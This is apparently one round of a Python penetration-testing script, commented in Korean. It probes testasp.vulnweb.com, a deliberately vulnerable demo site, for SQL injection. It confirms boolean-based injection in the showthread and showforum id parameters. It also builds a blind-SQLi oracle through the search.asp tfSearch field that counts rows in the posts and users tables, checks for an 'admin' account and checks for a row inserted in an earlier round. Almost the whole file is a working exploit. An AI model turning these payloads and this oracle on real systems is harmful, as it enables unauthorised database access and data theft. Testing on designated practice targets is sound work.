#!/usr/bin/env python3
"""Round 14-b — 현존 스레드/포럼 id 발견 + id SQLi 재확인 + 오라클 기준값(리셋 후 드리프트). 읽기 전용."""
import re
import urllib.error
import urllib.parse
import urllib.request

MARK = "class=" + chr(39) + "posttext" + chr(39)
B = "http://testasp.vulnweb.com"


class NR(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


OP = urllib.request.build_opener(NR)
N = [0]


def g(p):
    N[0] += 1
    try:
        with OP.open(B + p, timeout=30) as r:
            return r.status, r.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin-1", "replace")


def sq(cond):
    body = g("/search.asp?tfSearch=" + urllib.parse.quote("zzq')>0 OR (" + cond + "))--", safe=""))[1]
    return body.count(MARK) > 0


def rows(cond):
    body = g("/search.asp?tfSearch=" + urllib.parse.quote("zzq')>0 OR (" + cond + "))--", safe=""))[1]
    return body.count(MARK)


print("### 스레드 id 발견 (포럼 페이지에서)")
tids = []
for fid in ["0", "1", "2"]:
    st, b = g(f"/showforum.asp?id={fid}")
    t = sorted(set(re.findall(r"showthread\.asp\?id=(\d+)", b, re.I)))
    print(f"  showforum?id={fid} → {st}, thread ids={t}")
    tids += t
tids = sorted(set(int(x) for x in tids))
print(f"  전체 스레드 id: {tids}")

print("\n### id SQLi 재확인 (현존 id 대상)")
for tid in tids[:4]:
    a = g("/showthread.asp?id=" + urllib.parse.quote(f"{tid} AND 1=1", safe=""))[0]
    b_ = g("/showthread.asp?id=" + urllib.parse.quote(f"{tid} AND 1=2", safe=""))[0]
    print(f"  showthread id={tid}: AND 1=1 → {a} / AND 1=2 → {b_}")
for fid in ["0", "1", "2"]:
    a = g("/showforum.asp?id=" + urllib.parse.quote(f"{fid} AND 1=1", safe=""))[0]
    b_ = g("/showforum.asp?id=" + urllib.parse.quote(f"{fid} AND 1=2", safe=""))[0]
    print(f"  showforum  id={fid}: AND 1=1 → {a} / AND 1=2 → {b_}")

print("\n### 오라클 기준값 (리셋 후 드리프트 기록)")
print("  (1=1) TRUE 행수  :", rows("(1=1)"))
print("  (1=2) FALSE 행수 :", rows("(1=2)"))
print("  posts 총수 <30?  :", sq("(SELECT COUNT(*) FROM posts)<30"), "/ <200?", sq("(SELECT COUNT(*) FROM posts)<200"))
print("  users 총수 >200? :", sq("(SELECT COUNT(*) FROM users)>200"))
print("  admin 실존?      :", sq("(SELECT COUNT(*) FROM users WHERE uname='admin')>0"))
print("  Round13 주입행 잔존? :", sq("(SELECT COUNT(*) FROM users WHERE uname='rt12x')>0"))
print(f"\n총 요청 {N[0]}건 (읽기 전용)")
